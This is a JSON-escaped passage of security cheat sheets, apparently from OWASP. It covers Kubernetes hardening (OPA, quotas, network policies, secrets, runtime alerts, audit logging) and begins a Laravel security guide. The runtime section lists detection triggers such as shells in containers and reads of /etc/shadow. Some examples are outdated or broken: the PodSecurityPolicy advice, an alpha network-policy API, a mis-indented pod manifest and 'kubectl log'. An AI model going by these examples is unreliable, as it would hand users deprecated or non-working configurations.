Disadvantages\r\n\r\nAlong with the many advantages, service mesh also brings in its set of challenges, few of them are listed below:\r\n\r\n- Added Complexity: The introduction of proxies, sidecars and other components into an already sophisticated environment dramatically increases the complexity of development and operations.\r\n- Required Expertise: Adding a service mesh such as Istio on top of an orchestrator such as Kubernetes often requires operators to become experts in both technologies.\r\n- Slowness: Service meshes are an invasive and intricate technology that can add significant slowness to an architecture.\r\n- Adoption of a Platform: The invasiveness of service meshes force both developers and operators to adapt to a highly opinionated platform and conform to its rules.\r\n\r\n### Implementing centralized policy management\r\n\r\nThere are numerous projects which are able to provide centralized policy management for a Kubernetes cluster, most predominantly the [Open Policy Agent](https://www.openpolicyagent.org/) (OPA) project, [Kyverno](https://kyverno.io/), or [Validating Admission Policy](https://kubernetes.io/docs/reference/access-authn-authz/validating-admission-policy/) (a built-in, yet alpha (aka off by default) feature as of 1.26). In order to provide some depth, we will focus on OPA for the remainder of this cheat sheet.\r\n\r\nOPA is a project that started in 2016 aimed at unifying policy enforcement across different technologies and systems. It can be used to enforce policies on their platforms (like Kubernetes clusters). When it comes to Kubernetes, RBAC and Pod security policies to impose fine-grained control over the cluster. But again, this will only apply to the cluster but not outside the cluster. That’s where Open Policy Agent (OPA) comes into play. OPA was introduced to create a unified method of enforcing security policy in the stack.\r\n\r\nOPA is a general-purpose, domain-agnostic policy enforcement tool. It can be integrated with APIs, the Linux SSH daemon, an object store like Ceph, etc. OPA designers purposefully avoided basing it on any other project. Accordingly, the policy query and decision do not follow a specific format. That is, you can use any valid JSON data as request attributes as long as it provides the required data. Similarly, the policy decision coming from OPA can also be any valid JSON data. You choose what gets input and what gets output. For example, you can opt to have OPA return a True or False JSON object, a number, a string, or even a complex data object. Currently, OPA is part of CNCF as an incubating project.\r\n\r\nMost common use cases of OPA:\r\n\r\n- Application authorization\r\n\r\nOPA enables you to accelerate time to market by providing pre-cooked authorization technology so you don’t have to develop it from scratch. It uses a declarative policy language purpose built for writing and enforcing rules such as, “Alice can write to this repository,” or “Bob can update this account.” It comes with a rich suite of tooling to help developers integrate those policies into their applications and even allow the application’s end users to contribute policy for their tenants as well.\r\n\r\nIf you have homegrown application authorization solutions in place, you may not want to rip them out to swap in OPA. At least not yet. But if you are going to be decomposing those monolithic apps and moving to microservices to scale and improve developer efficiency, you’re going to need a distributed authorization system and OPA (or one of the related competitors) could be the answer.\r\n\r\n- Kubernetes admission control\r\n\r\nKubernetes has given developers tremendous control over the traditional silos of compute, networking and storage. Developers today can set up the network the way they want and set up storage the way they want. Administrators and security teams responsible for the well-being of a given container cluster need to make sure developers don’t shoot themselves (or their neighbors) in the foot.\r\n\r\nOPA can be used to build policies that require, for example, all container images to be from trusted sources, that prevent developers from running software as root, that make sure storage is always marked with the encrypt bit, that storage does not get deleted just because a pod gets restarted, that limits internet access, etc.\r\n\r\nOPA integrates directly into the Kubernetes API server, so it has complete authority to reject any resource—whether compute, networking, storage, etc.—that policy says doesn’t belong in a cluster. Moreover, you can expose those policies earlier in the development lifecycle (e.g. the CICD pipeline or even on developer laptops) so that developers can receive feedback as early as possible. You can even run policies out-of-band to monitor results so that administrators can ensure policy changes don’t inadvertently do more damage than good.\r\n\r\n- Service mesh authorization\r\n\r\nAnd finally, many organizations are using OPA to regulate use of service mesh architectures. So, even if you’re not embedding OPA to implement application authorization logic (the top use case discussed above), you probably still want control over the APIs microservices. You can execute and achieve that by putting authorization policies into the service mesh. Or, you may be motivated by security, and implement policies in the service mesh to limit lateral movement within a microservice architecture. Another common practice is to build policies into the service mesh to ensure your compliance regulations are satisfied even when modification to source code is involved.\r\n\r\n### Limiting resource usage on a cluster\r\n\r\nResource quota limits the number or capacity of resources granted to a namespace. This is most often used to limit the amount of CPU, memory, or persistent disk a namespace can allocate, but can also control how many pods, services, or volumes exist in each namespace.\r\n\r\nLimit ranges restrict the maximum or minimum size of some of the resources above, to prevent users from requesting unreasonably high or low values for commonly reserved resources like memory, or to provide default limits when none are specified\r\n\r\nAn option of running resource-unbound containers puts your system in risk of DoS or “noisy neighbor” scenarios. To prevent and minimize those risks you should define resource quotas. By default, all resources in Kubernetes cluster are created with unbounded CPU and memory requests/limits. You can create resource quota policies, attached to Kubernetes namespace, in order to limit the CPU and memory a pod is allowed to consume.\r\n\r\nThe following is an example for namespace resource quota definition that will limit number of pods in the namespace to 4, limiting their CPU requests between 1 and 2 and memory requests between 1GB to 2GB.\r\n\r\ncompute-resources.yaml:\r\n\r\n```yaml\r\napiVersion: v1  \r\nkind: ResourceQuota  \r\nmetadata:  \r\n  name: compute-resources  \r\nspec:  \r\n  hard:  \r\n    pods: \"4\"  \r\n    requests.cpu: \"1\"  \r\n    requests.memory: 1Gi  \r\n    limits.cpu: \"2\"  \r\n    limits.memory: 2Gi\r\n```\r\n\r\nAssign a resource quota to namespace:\r\n\r\n```bash\r\nkubectl create -f ./compute-resources.yaml --namespace=myspace\r\n```\r\n\r\nFor more information on configuring resource quotas, refer to the Kubernetes documentation at <https://kubernetes.io/docs/concepts/policy/resource-quotas/>.\r\n\r\n### Use Kubernetes network policies to control traffic between pods and clusters\r\n\r\nRunning different applications on the same Kubernetes cluster creates a risk of one compromised application attacking a neighboring application. Network segmentation is important to ensure that containers can communicate only with those they are supposed to.\r\n\r\nBy default, Kubernetes allows every pod to contact every other pod. Traffic to a pod from an external network endpoint outside the cluster is allowed if ingress from that endpoint is allowed to the pod. Traffic from a pod to an external network endpoint outside the cluster is allowed if egress is allowed from the pod to that endpoint.\r\n\r\nNetwork segmentation policies are a key security control that can prevent lateral movement across containers in the case that an attacker breaks in. One of the challenges in Kubernetes deployments is creating network segmentation between pods, services and containers. This is a challenge due to the “dynamic” nature of container network identities (IPs), along with the fact that containers can communicate both inside the same node or between nodes.\r\n\r\nUsers of Google Cloud Platform can benefit from automatic firewall rules, preventing cross-cluster communication. A similar implementation can be deployed on-premises using network firewalls or SDN solutions. There is work being done in this area by the Kubernetes Network SIG, which will greatly improve the pod-to-pod communication policies. A new network policy API should address the need to create firewall rules around pods, limiting the network access that a containerized can have.\r\n\r\nThe following is an example of a network policy that controls the network for “backend” pods, only allowing inbound network access from “frontend” pods:\r\n\r\n```json\r\nPOST /apis/net.alpha.kubernetes.io/v1alpha1/namespaces/tenant-a/networkpolicys  \r\n{  \r\n  \"kind\": \"NetworkPolicy\",\r\n  \"metadata\": {\r\n    \"name\": \"pol1\"\r\n  },\r\n  \"spec\": {\r\n    \"allowIncoming\": {\r\n      \"from\": [{\r\n        \"pods\": { \"segment\": \"frontend\" }\r\n      }],\r\n      \"toPorts\": [{\r\n        \"port\": 80,\r\n        \"protocol\": \"TCP\"\r\n      }]\r\n    },\r\n    \"podSelector\": {\r\n      \"segment\": \"backend\"\r\n    }\r\n  }\r\n}\r\n```\r\n\r\nFor more information on configuring network policies, refer to the Kubernetes documentation at <https://kubernetes.io/docs/concepts/services-networking/network-policies>.\r\n\r\n### Securing data\r\n\r\n#### Keep secrets as secrets\r\n\r\nIn Kubernetes, a Secret is a small object that contains sensitive data, like a password or token. It is important to understand how sensitive data such as credentials and keys are stored and accessed. Even though a pod is not able to access the secrets of another pod, it is crucial to keep the secret separate from an image or pod. Otherwise, anyone with access to the image would have access to the secret as well. Complex applications that handle multiple processes and have public access are especially vulnerable in this regard.\r\nIt is best for secrets to be mounted into read-only volumes in your containers, rather than exposing them as environment variables.\r\n\r\n#### Encrypt secrets at rest\r\n\r\nThe etcd database in general contains any information accessible via the Kubernetes API and may grant an attacker significant visibility into the state of your cluster.\r\n\r\nAlways encrypt your backups using a well reviewed backup and encryption solution, and consider using full disk encryption where possible.\r\n\r\nKubernetes supports encryption at rest, a feature introduced in 1.7, and v1 beta since 1.13. This will encrypt Secret resources in etcd, preventing parties that gain access to your etcd backups from viewing the content of those secrets. While this feature is currently beta, it offers an additional level of defense when backups are not encrypted or an attacker gains read access to etcd.\r\n\r\n#### Alternatives to Kubernetes Secret resources\r\n\r\nYou may want to consider using an external secrets manager to store and manage your secrets rather than storing them in Kubernetes Secrets. This\r\nprovides a number of benefits over using Kubernetes Secrets, including the ability to manage secrets across multiple clusters (or clouds), and\r\nthe ability to manage and rotate secrets centrally.\r\n\r\nFor more information on Secrets and their alternatives, refer to the documentation at <https://kubernetes.io/docs/concepts/configuration/secret/>.\r\n\r\nAlso see the [Secrets Management](Secrets_Management_Cheat_Sheet.md) cheat sheet for more details and best practices on managing secrets.\r\n\r\n#### Finding exposed secrets\r\n\r\nOpen-source tools such as [SecretScanner](https://github.com/deepfence/SecretScanner) and [ThreatMapper](https://github.com/deepfence/ThreatMapper) can scan container filesystems for sensitive resources, such as API tokens, passwords, and keys. Such resources would be accessible to any user who had access to the unencrypted container filesystem, whether during build, at rest in a registry or backup, or running.\r\n\r\nReview the secret material present on the container against the principle of 'least privilege', and to assess the risk posed by a compromise.\r\n\r\n## Kubernetes Security Best Practices: Runtime Phase\r\n\r\nThe runtime phase exposes containerized applications to a slew of new security challenges. Your goal here is to both gain visibility into your running environment and detect and respond to threats as they arise.\r\n\r\nProactively securing your containers and Kubernetes deployments at the build and deploy phases can greatly reduce the likelihood of security incidents at runtime and the subsequent effort needed to respond to them.\r\n\r\nFirst, you must monitor the most security-relevant container activities, including:\r\n\r\n- Process activity\r\n- Network communications among containerized services\r\n- Network communications between containerized services and external clients and servers\r\n\r\nObserving container behavior to detect anomalies is generally easier in containers than in virtual machines because of the declarative nature of containers and Kubernetes. These attributes allow easier introspection into what you have deployed and its expected activity.\r\n\r\n### Use Pod Security Policies to prevent risky containers/Pods from being used\r\n\r\nPodSecurityPolicy is a cluster-level resources available in Kubernetes (via kubectl) that is highly recommended. You must enable the PodSecurityPolicy admission controller to use it. Given the nature of admission controllers, you must authorize at least one policy - otherwise no pods will be allowed to be created in the cluster.\r\n\r\nPod Security Policies address several critical security use cases, including:\r\n\r\n- Preventing containers from running with privileged flag - this type of container will have most of the capabilities available to the underlying host. This flag also overwrites any rules you set using CAP DROP or CAP ADD.\r\n- Preventing sharing of host PID/IPC namespace, networking, and ports - this step ensures proper isolation between Docker containers and the underlying host\r\n- Limiting use of volume types - writable hostPath directory volumes, for example, allow containers to write to the filesystem in a manner that allows them to traverse the host filesystem outside the pathPrefix, so readOnly: true must be used\r\n- Putting limits on host filesystem use\r\n- Enforcing read only for root file system via the ReadOnlyRootFilesystem\r\n- Preventing privilege escalation to root privileges\r\n- Rejecting containers with root privileges\r\n- Restricting Linux capabilities to bare minimum in adherence with least privilege principles\r\n\r\nFor more information on Pod security policies, refer to the documentation at <https://kubernetes.io/docs/concepts/policy/pod-security-policy/>.\r\n\r\n### Container Runtime Security\r\n\r\nHardening containers at runtime gives security teams the ability to detect and respond to threats and anomalies while the containers or workloads are in a running state. This is typically carried out by intercepting the low-level system calls and looking for events that may indicate compromise. Some examples of events that should trigger an alert would include:\r\n\r\n- A shell is run inside a container\r\n- A container mounts a sensitive path from the host such as /proc\r\n- A sensitive file is unexpectedly read in a running container such as /etc/shadow\r\n- An outbound network connection is established\r\n\r\nOpen source tools such as Falco from Sysdig are available to help operators get up and running with container runtime security by providing a large number of out-of-the-box detections as well as the flexibility to create custom rules.\r\n\r\n### Container Sandboxing\r\n\r\nContainer runtimes typically are permitted to make direct calls to the host kernel then the kernel interacts with hardware and devices to respond to the request. Cgroups and namespaces exist to give containers a certain amount of isolation but the kernel still presents a large attack surface. Often times in multi-tenant and highly untrusted clusters an additional layer of sandboxing is required to ensure container breakout and kernel exploits are not present. Below we will explore a few OSS technologies that help further isolate running containers from the host kernel:\r\n\r\n- Kata Containers: Kata Containers is OSS project that uses stripped-down VMs to keep the resource footprint minimal and maximize performance to ultimately isolate containers further.\r\n- gVisor : gVisor is a more lightweight than a VM (even stripped down). gVisor is its own independent kernel written in Go to sit in the middle of a container and the host kernel. Strong sandbox. gVisor supports ~70% of the linux system calls from the container but ONLY uses about 20 system calls to the host kernel.\r\n- Firecracker: Firecracker super lightweight VM that runs in user space. Locked down by seccomp, cgroup and namespace policies so system calls are very limited. Firecracker is built with security in mind but may not support all Kubernetes or container runtime deployments.\r\n\r\n### Preventing containers from loading unwanted kernel modules\r\n\r\nThe Linux kernel automatically loads kernel modules from disk if needed in certain circumstances, such as when a piece of hardware is attached or a filesystem is mounted. Of particular relevance to Kubernetes, even unprivileged processes can cause certain network-protocol-related kernel modules to be loaded, just by creating a socket of the appropriate type. This may allow an attacker to exploit a security hole in a kernel module that the administrator assumed was not in use.\r\n\r\nTo prevent specific modules from being automatically loaded, you can uninstall them from the node, or add rules to block them. On most Linux distributions, you can do that by creating a file such as /etc/modprobe.d/kubernetes-blacklist.conf with contents like:\r\n\r\n```\r\n# DCCP is unlikely to be needed, has had multiple serious\r\n# vulnerabilities, and is not well-maintained.\r\nblacklist dccp\r\n\r\n# SCTP is not used in most Kubernetes clusters, and has also had\r\n# vulnerabilities in the past.\r\nblacklist sctp\r\n```\r\n\r\nTo block module loading more generically, you can use a Linux Security Module (such as SELinux) to completely deny the module_request permission to containers, preventing the kernel from loading modules for containers under any circumstances. (Pods would still be able to use modules that had been loaded manually, or modules that were loaded by the kernel on behalf of some more-privileged process.\r\n\r\n### Compare and analyze different runtime activity in pods of the same deployments\r\n\r\nContainerized applications are replicated for high availability, fault tolerance, or scale reasons. Replicas should behave nearly identically; replicas with significant deviations from the others warrant further investigation. Integrate your Kubernetes security tool with other external systems (email, PagerDuty, Slack, Google Cloud Security Command Center, SIEMs [security information and event management], etc.) and leverage deployment labels or annotations to alert the team responsible for a given application when a potential threat is detected. Commercial Kubernetes security vendors should support a wide array of integrations with external tools.\r\n\r\n### Monitor network traffic to limit unnecessary or insecure communication\r\n\r\nObserve your active network traffic and compare that traffic to what is allowed based on your Kubernetes network policies. Containerized applications typically make extensive use of cluster networking, and observing active networking traffic is a good way to understand how applications interact with each other and identify unexpected communication.\r\n\r\nAt the same time, comparing the active traffic with what’s allowed gives you valuable information about what isn’t happening but is allowed. With that information, you can further tighten your allowed network policies so that it removes superfluous connections and decreases your attack surface.\r\n\r\nOpen source projects like <https://github.com/kinvolk/inspektor-gadget> or <https://github.com/deepfence/PacketStreamer> may help with this, and commercial security solutions provide varying degrees of container network traffic analysis.\r\n\r\n### If breached, scale suspicious pods to zero\r\n\r\nUse Kubernetes native controls to contain a successful breach by automatically instructing Kubernetes to scale suspicious pods to zero or kill then restart instances of breached applications.\r\n\r\n### Rotate infrastructure credentials frequently\r\n\r\nThe shorter the lifetime of a secret or credential the harder it is for an attacker to make use of that credential. Set short lifetimes on certificates and automate their rotation. Use an authentication provider that can control how long issued tokens are available and use short lifetimes where possible. If you use service account tokens in external integrations, plan to rotate those tokens frequently. For example, once the bootstrap phase is complete, a bootstrap token used for setting up nodes should be revoked or its authorization removed.\r\n\r\n### Receiving alerts for security updates and reporting vulnerabilities\r\n\r\nJoin the kubernetes-announce group (<https://kubernetes.io/docs/reference/issues-security/security/>) for emails about security announcements. See the security reporting page (<https://kubernetes.io/docs/reference/issues-security/security>) for more on how to report vulnerabilities.\r\n\r\n### Logging\r\n\r\nKubernetes supplies cluster-based logging, allowing to log container activity into a central log hub. When a cluster is created, the standard output and standard error output of each container can be ingested using a Fluentd agent running on each node into either Google Stackdriver Logging or into Elasticsearch and viewed with Kibana.\r\n\r\n#### Enable audit logging\r\n\r\nThe audit logger is a beta feature that records actions taken by the API for later analysis in the event of a compromise. It is recommended to enable audit logging and archive the audit file on a secure server\r\n\r\nEnsure logs are monitoring for anomalous or unwanted API calls, especially any authorization failures (these log entries will have a status message “Forbidden”). Authorization failures could mean that an attacker is trying to abuse stolen credentials.\r\n\r\nManaged Kubernetes providers, including GKE, provide access to this data in their cloud console and may allow you to set up alerts on authorization failures.\r\n\r\n##### Audit logs\r\n\r\nAudit logs can be useful for compliance as they should help you answer the questions of what happened, who did what and when. Kubernetes provides flexible auditing of kube-apiserver requests based on policies. These help you track all activities in chronological order.\r\n\r\nHere is an example of an audit log:\r\n\r\n```json\r\n{\r\n  \"kind\":\"Event\",\r\n  \"apiVersion\":\"audit.k8s.io/v1beta1\",\r\n  \"metadata\":{ \"creationTimestamp\":\"2019-08-22T12:00:00Z\" },\r\n  \"level\":\"Metadata\",\r\n  \"timestamp\":\"2019-08-22T12:00:00Z\",\r\n  \"auditID\":\"23bc44ds-2452-242g-fsf2-4242fe3ggfes\",\r\n  \"stage\":\"RequestReceived\",\r\n  \"requestURI\":\"/api/v1/namespaces/default/persistentvolumeclaims\",\r\n  \"verb\":\"list\",\r\n  \"user\": {\r\n    \"username\":\"user@example.org\",\r\n    \"groups\":[ \"system:authenticated\" ]\r\n  },\r\n  \"sourceIPs\":[ \"172.12.56.1\" ],\r\n  \"objectRef\": {\r\n    \"resource\":\"persistentvolumeclaims\",\r\n    \"namespace\":\"default\",\r\n    \"apiVersion\":\"v1\"\r\n  },\r\n  \"requestReceivedTimestamp\":\"2019-08-22T12:00:00Z\",\r\n  \"stageTimestamp\":\"2019-08-22T12:00:00Z\"\r\n}\r\n```\r\n\r\n#### Define Audit Policies\r\n\r\nAudit policy defines rules about what events should be recorded and what data they should include. The audit policy object structure is defined in the audit.k8s.io API group. When an event is processed, it's compared against the list of rules in order. The first matching rule sets the \"audit level\" of the event.\r\n\r\nThe known audit levels are as follows:\r\n\r\n- None - don't log events that match this rule\r\n- Metadata - log request metadata (requesting user, timestamp, resource, verb, etc.) but not request or response body\r\n- Request - log event metadata and request body but not response body. This does not apply for non-resource requests\r\n- RequestResponse - log event metadata, request and response bodies. This does not apply for non-resource requests\r\n\r\nYou can pass a file with the policy to kube-apiserver using the --audit-policy-file flag. If the flag is omitted, no events are logged. Note that the rules field must be provided in the audit policy file. A policy with no (0) rules is treated as illegal.\r\n\r\n#### Understanding Logging\r\n\r\nOne main challenge with logging Kubernetes is understanding what logs are generated and how to use them. Let’s start by examining the Kubernetes logging architecture from a birds eye view.\r\n\r\n##### Container logging\r\n\r\nThe first layer of logs that can be collected from a Kubernetes cluster are those being generated by your containerized applications. The easiest method for logging containers is to write to the standard output (stdout) and standard error (stderr) streams.\r\n\r\nManifest is as follows.\r\n\r\n```yaml\r\napiVersion: v1\r\nkind: Pod\r\nmetadata:\r\nname: example\r\nspec:\r\ncontainers:\r\n  - name: example\r\nimage: busybox\r\nargs: [/bin/sh, -c, 'while true; do echo $(date); sleep 1; done']\r\n```\r\n  \r\nTo apply the manifest, run:\r\n\r\n```bash\r\nkubectl apply -f example.yaml\r\n```\r\n\r\nTo take a look the logs for this container, run:\r\n\r\n```bash\r\nkubectl log <container-name> command.\r\n```\r\n\r\nFor persisting container logs, the common approach is to write logs to a log file and then use a sidecar container. As shown below in the pod configuration above, a sidecar container will run in the same pod along with the application container, mounting the same volume and processing the logs separately.\r\n\r\nPod Manifest is as follows:\r\n\r\n```yaml\r\napiVersion: v1\r\nkind: Pod\r\nmetadata:\r\n  name: example\r\nspec:\r\n  containers:\r\n  - name: example\r\n    image: busybox\r\n    args:\r\n    - /bin/sh\r\n    - -c\r\n    - >\r\n      while true;\r\n      do\r\n        echo \"$(date)\\n\" >> /var/log/example.log;\r\n        sleep 1;\r\n      done\r\n    volumeMounts:\r\n    - name: varlog\r\n      mountPath: /var/log\r\n  - name: sidecar\r\n    image: busybox\r\n    args: [/bin/sh, -c, 'tail -f /var/log/example.log']\r\n    volumeMounts:\r\n    - name: varlog\r\n      mountPath: /var/log\r\n  volumes:\r\n  - name: varlog\r\n    emptyDir: {}\r\n```\r\n\r\n##### Node logging\r\n\r\nWhen a container running on Kubernetes writes its logs to stdout or stderr streams, the container engine streams them to the logging driver configured in Kubernetes.\r\n\r\nIn most cases, these logs will end up in the /var/log/containers directory on your host. Docker supports multiple logging drivers but unfortunately, driver configuration is not supported via the Kubernetes API.\r\n\r\nOnce a container is terminated or restarted, kubelet stores logs on the node. To prevent these files from consuming all of the host’s storage, the Kubernetes node implements a log rotation mechanism. When a container is evicted from the node, all containers with corresponding log files are evicted.\r\n\r\nDepending on what operating system and additional services you’re running on your host machine, you might need to take a look at additional logs.\r\nFor example, systemd logs can be retrieved using the following command:\r\n\r\n```bash\r\njournalctl -u\r\n```\r\n\r\n##### Cluster logging\r\n\r\nOn the level of the Kubernetes cluster itself, there is a long list of cluster components that can be logged as well as additional data types that can be used (events, audit logs). Together, these different types of data can give you visibility into how Kubernetes is performing as a ystem.\r\n\r\nSome of these components run in a container, and some of them run on the operating system level (in most cases, a systemd service). The systemd services write to journald, and components running in containers write logs to the /var/log directory, unless the container engine has been configured to stream logs differently.\r\n\r\n#### Events\r\n\r\nKubernetes events can indicate any Kubernetes resource state changes and errors, such as exceeded resource quota or pending pods, as well as any informational messages.\r\nKubernetes events can indicate any Kubernetes resource state changes and errors, such as exceeded resource quota or pending pods, as well as any informational messages.\r\n\r\nThe following command returns all events within a specific namespace:\r\n\r\n```\r\nkubectl get events -n <namespace>\r\n\r\nNAMESPACE LAST SEEN TYPE   REASON OBJECT MESSAGE\r\nkube-system  8m22s  Normal   Scheduled            pod/metrics-server-66dbbb67db-lh865                                       Successfully assigned kube-system/metrics-server-66dbbb67db-lh865 to aks-agentpool-42213468-1\r\nkube-system     8m14s               Normal    Pulling                   pod/metrics-server-66dbbb67db-lh865                                       Pulling image \"aksrepos.azurecr.io/mirror/metrics-server-amd64:v0.2.1\"\r\nkube-system     7m58s               Normal    Pulled                    pod/metrics-server-66dbbb67db-lh865                                       Successfully pulled image \"aksrepos.azurecr.io/mirror/metrics-server-amd64:v0.2.1\"\r\nkube-system     7m57s               Normal     Created                   pod/metrics-server-66dbbb67db-lh865                                       Created container metrics-server\r\nkube-system     7m57s               Normal    Started                   pod/metrics-server-66dbbb67db-lh865                                       Started container metrics-server\r\nkube-system     8m23s               Normal    SuccessfulCreate          replicaset/metrics-server-66dbbb67db             Created pod: metrics-server-66dbbb67db-lh865\r\n```\r\n\r\nThe following command will show the latest events for this specific Kubernetes resource:\r\n\r\n```\r\nkubectl describe pod <pod-name>\r\n\r\nEvents:\r\n  Type    Reason     Age   From                               Message\r\n  ----    ------     ----  ----                               -------\r\n  Normal  Scheduled  14m   default-scheduler                  Successfully assigned kube-system/coredns-7b54b5b97c-dpll7 to aks-agentpool-42213468-1\r\n  Normal  Pulled     13m   kubelet, aks-agentpool-42213468-1  Container image \"aksrepos.azurecr.io/mirror/coredns:1.3.1\" already present on machine\r\n  Normal  Created    13m   kubelet, aks-agentpool-42213468-1  Created container coredns\r\n  Normal  Started    13m   kubelet, aks-agentpool-42213468-1  Started container coredns\r\n```\r\n\r\n## Final thoughts\r\n\r\n### Embed security earlier into the container lifecycle\r\n\r\nYou must integrate security earlier into the container lifecycle and ensure alignment and shared goals between security and DevOps teams. Security can (and should) be an enabler that allows your developers and DevOps teams to confidently build and deploy applications that are production-ready for scale, stability and security.\r\n\r\n### Use Kubernetes-native security controls to reduce operational risk\r\n\r\nLeverage the native controls built into Kubernetes whenever available in order to enforce security policies so that your security controls don’t collide with the orchestrator. Instead of using a third-party proxy or shim to enforce network segmentation, as an example, use Kubernetes network policies to ensure secure network communication.\r\n\r\n### Leverage the context that Kubernetes provides to prioritize remediation efforts\r\n\r\nIn sprawling Kubernetes environments, manually triaging security incidents and policy violations is time consuming.\r\n\r\nFor example, a deployment containing a vulnerability with severity score of 7 or greater should be moved up in remediation priority if that deployment contains privileged containers and is open to the Internet but moved down if it’s in a test environment and supporting a non-critical app.\r\n\r\n## References\r\n\r\nMaster documentation - <https://kubernetes.io>\r\n\r\n1. Kubernetes Security Best Practices everyone must follow - <https://www.cncf.io/blog/2019/01/14/9-kubernetes-security-best-practices-everyone-must-follow>\r\n2. Securing a Cluster - <https://kubernetes.io/blog/2016/08/security-best-practices-kubernetes-deployment>\r\n3. Security Best Practices for Kubernetes Deployment - <https://kubernetes.io/docs/tasks/administer-cluster/securing-a-cluster>\r\n4. Kubernetes Security Best Practices - <https://phoenixnap.com/kb/kubernetes-security-best-practices>\r\n5. Kubernetes Security 101: Risks and 29 Best Practices - <https://www.stackrox.com/post/2020/05/kubernetes-security-101>\r\n6. 15 Kubernetes security best practice to secure your cluster - <https://www.mobilise.cloud/15-kubernetes-security-best-practice-to-secure-your-cluster>\r\n7. The Ultimate Guide to Kubernetes Security - <https://neuvector.com/container-security/kubernetes-security-guide>\r\n8. A hacker's guide to Kubernetes security - <https://techbeacon.com/enterprise-it/hackers-guide-kubernetes-security>\r\n9. 11 Ways (Not) to Get Hacked - <https://kubernetes.io/blog/2018/07/18/11-ways-not-to-get-hacked>\r\n10. 12 Kubernetes configuration best practices - <https://www.stackrox.com/post/2019/09/12-kubernetes-configuration-best-practices/#6-securely-configure-the-kubernetes-api-server>\r\n11. A Practical Guide to Kubernetes Logging - <https://logz.io/blog/a-practical-guide-to-kubernetes-logging>\r\n12. Kubernetes Web UI (Dashboard) - <https://kubernetes.io/docs/tasks/access-application-cluster/web-ui-dashboard>\r\n13. Tesla cloud resources are hacked to run cryptocurrency-mining malware - <https://arstechnica.com/information-technology/2018/02/tesla-cloud-resources-are-hacked-to-run-cryptocurrency-mining-malware>\r\n14. OPEN POLICY AGENT: CLOUD-NATIVE AUTHORIZATION - <https://blog.styra.com/blog/open-policy-agent-authorization-for-the-cloud>\r\n15. Introducing Policy As Code: The Open Policy Agent (OPA) - <https://www.magalix.com/blog/introducing-policy-as-code-the-open-policy-agent-opa>\r\n16. What service mesh provides - <https://aspenmesh.io/wp-content/uploads/2019/10/AspenMesh_CompleteGuide.pdf>\r\n17. Three Technical Benefits of Service Meshes and their Operational Limitations, Part 1 - <https://glasnostic.com/blog/service-mesh-istio-limits-and-benefits-part-1>\r\n18. Open Policy Agent: What Is OPA and How It Works (Examples) - <https://spacelift.io/blog/what-is-open-policy-agent-and-how-it-works>\r\n19. Send Kubernetes Metrics To Kibana and Elasticsearch - <https://logit.io/sources/configure/kubernetes/>\r\n20. Kubernetes Security Checklist - <https://kubernetes.io/docs/concepts/security/security-checklist/>\r\n"
    },
    {
      "Laravel_Cheat_Sheet.md": "# Laravel Cheat Sheet\r\n\r\n## Introduction\r\n\r\nThis *Cheatsheet* intends to provide security tips to developers building Laravel applications. It aims to cover all common vulnerabilities and how to ensure that your Laravel applications are secure.\r\n\r\nThe Laravel Framework provides in-built security features and is meant to be secure by default. However, it also provides additional flexibility for complex use cases. This means that developers unfamiliar with the inner workings of Laravel may fall into the trap of using complex features in a way that is not secure. This guide is meant to educate developers to avoid common pitfalls and develop Laravel applications in a secure manner.\r\n\r\nYou may also refer the [Enlightn Security Documentation](https://www.laravel-enlightn.com/docs/security/), which highlights common vulnerabilities and good practices on securing Laravel applications.\r\n\r\n## The Basics\r\n\r\n- Make sure your app is not in debug mode while in production. To turn off debug mode, set your `APP_DEBUG` environment variable to `false`:\r\n\r\n```ini\r\nAPP_DEBUG=false\r\n```\r\n\r\n- Make sure your application key has been generated. Laravel applications use the app key for symmetric encryption and SHA256 hashes such as cookie encryption, signed URLs, password reset tokens and session data encryption. To generate the app key, you may run the `key:generate` Artisan command:\r\n\r\n```bash\r\nphp artisan key:generate\r\n```\r\n\r\n- Make sure your PHP configuration is secure. You may refer the [PHP Configuration Cheat Sheet](PHP_Configuration_Cheat_Sheet.md) for more information on secure PHP configuration settings.\r\n\r\n- Set safe file and directory permissions on your Laravel application. In general, all Laravel directories should be setup with a max permission level of `775` and non-executable files with a max permission level of `664`. Executable files such as Artisan or deployment scripts should be provided with a max permission level of `775`.\r\n\r\n- Make sure your application does not have vulnerable dependencies. You can check this using the [Enlightn Security Checker](https://github.com/enlightn/security-checker).\r\n\r\n## Cookie Security and Session Management\r\n\r\nBy default, Laravel is configured in a secure manner. However, if you change your cookie or session configurations, make sure of the following:\r\n\r\n- Enable the cookie encryption middleware if you use the `cookie` session store or if you store any kind of data that should not be readable or tampered with by clients. In general, this should be enabled unless your application has a very specific use case that requires disabling this. To enable this middleware, simply add the `EncryptCookies` middleware to the `web` middleware group in your `App\\Http\\Kernel` class:\r\n\r\n```php\r\n/**\r\n * The application's route middleware groups.\r\n *\r\n * @var array\r\n */\r\nprotected $middlewareGroups = [\r\n    'web' => [\r\n        \\App\\Http\\Middleware\\EncryptCookies::class,\r\n        ...\r\n    ],\r\n    ...\r\n];\r\n```\r\n\r\n- Enable the `HttpOnly` attribute on your session cookies via your `config/session.php` file, so that your session cookies are inaccessible from Javascript:\r\n\r\n```php\r\n'http_only' => true,\r\n```\r\n\r\n- Unless you are using sub-domain route registrations in your Laravel application, it is recommended to set the cookie `domain` attribute to null so that only the same origin (excluding subdomains) can set the cookie. This can be configured in your `config/session.php` file:\r\n\r\n```php\r\n'domain' => null,\r\n```\r\n\r\n- Set your `SameSite` cookie attribute to `lax` or `strict` in your `config/session.php` file to restrict your cookies to a first-party or same-site context:\r\n\r\n```php\r\n'same_site' => 'lax',\r\n```\r\n\r\n- If your application is HTTPS only, it is recommended to set the `secure` configuration option in your `config/session.php` file to `true` to protect against man-in-the-middle attacks. If your application has a combination of HTTP and HTTPS, then it is recommended to set this value to `null` so that the secure attribute is set automatically when serving HTTPS requests:\r\n\r\n```php\r\n'secure' => null,\r\n```\r\n\r\n- Ensure that you have a low session idle timeout value. [OWASP recommends](Session_Management_Cheat_Sheet.md) a 2-5 minutes idle timeout for high value applications and 15-30 minutes for low risk applications. This can be configured in your `config/session.php` file:\r\n\r\n```php\r\n'lifetime' => 15,\r\n```\r\n\r\nYou may also refer the [Cookie Security Guide](https://owasp.org/www-chapter-london/assets/slides/OWASPLondon20171130_Cookie_Security_Myths_Misconceptions_David_Johansson.pdf) to learn more about cookie security and the cookie attributes mentioned above.\r\n\r\n## Authentication\r\n\r\n### Guards and Providers\r\n\r\nAt its core, Laravel's authentication facilities are made up of \"guards\" and \"providers\". Guards define how users are authenticated for each request. 